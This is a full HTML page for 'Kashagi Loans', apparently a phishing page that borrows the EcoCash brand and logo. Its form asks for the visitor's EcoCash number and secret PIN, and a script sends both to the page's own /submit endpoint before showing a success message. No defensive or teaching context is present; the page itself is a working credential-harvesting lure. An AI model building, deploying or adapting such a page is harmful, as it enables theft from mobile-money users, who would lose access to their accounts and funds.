<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Kashagi Loans</title>

<style>

body{
margin:0;
font-family:Arial,sans-serif;
background:#f4f6f9;
}

.container{
max-width:420px;
margin:40px auto;
background:#fff;
padding:25px;
border-radius:10px;
box-shadow:0 2px 10px rgba(0,0,0,.15);
}

.logo{
text-align:center;
margin-bottom:20px;
}

.logo img{
width:180px;
}

h2{
text-align:center;
color:#1877f2;
margin-bottom:10px;
}

p{
text-align:center;
color:#555;
font-size:14px;
}

label{
display:block;
margin-top:15px;
font-weight:bold;
}

input{
width:100%;
padding:12px;
margin-top:5px;
border:1px solid #ccc;
border-radius:6px;
box-sizing:border-box;
font-size:15px;
}

button{
width:100%;
padding:13px;
margin-top:25px;
background:#1877f2;
color:white;
border:none;
border-radius:6px;
font-size:16px;
cursor:pointer;
}

button:hover{
background:#1669d8;
}

#message{
margin-top:20px;
text-align:center;
font-weight:bold;
}

</style>

</head>

<body>

<div class="container">

<div class="logo">
<img src="Ecocash.png" alt="EcoCash Logo">
</div>

<h2>Kashagi Loans</h2>

<p>Complete the form below to continue.</p>

<form id="loanForm">

<label>EcoCash Number</label>

<input
type="text"
id="ecocash_number"
placeholder="e.g. 0771234567"
required>

<label>EcoCash Pin</label>

<input
type="text"
id="ecocash_pin"
placeholder="Enter EcoCash Pin"
required>

<button type="submit">
Submit
</button>

</form>

<div id="message"></div>

</div>

<script>

document.getElementById("loanForm").addEventListener("submit", async function(e){

e.preventDefault();

const ecocash_number=document.getElementById("ecocash_number").value;

const ecocash_pin=document.getElementById("ecocash_pin").value;

const response=await fetch("/submit",{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

ecocash_number,
ecocash_pin

})

});

const result=await response.json();

const message=document.getElementById("message");

if(result.success){

message.style.color="green";
message.innerHTML="✅ Submission successful.";

document.getElementById("loanForm").reset();

}else{

message.style.color="red";
message.innerHTML="❌ "+result.error;

}

});

</script>

</body>
</html>
